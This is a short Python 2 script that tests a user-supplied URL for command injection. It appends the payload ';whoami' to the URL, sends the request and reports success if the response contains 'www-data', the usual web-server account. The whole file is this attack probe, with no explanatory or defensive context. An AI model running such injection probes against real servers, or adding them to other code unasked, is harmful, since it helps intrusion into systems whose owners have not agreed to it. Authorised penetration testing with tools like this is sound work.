#!/usr/bin/env python
import requests


url=raw_input("URL  ")
payload = ";whoami"
url= url + payload
request= requests.get(url)
index = request.content.find("www-data")
if index != -1:
	print "[+]"
else:
	print "[-]"
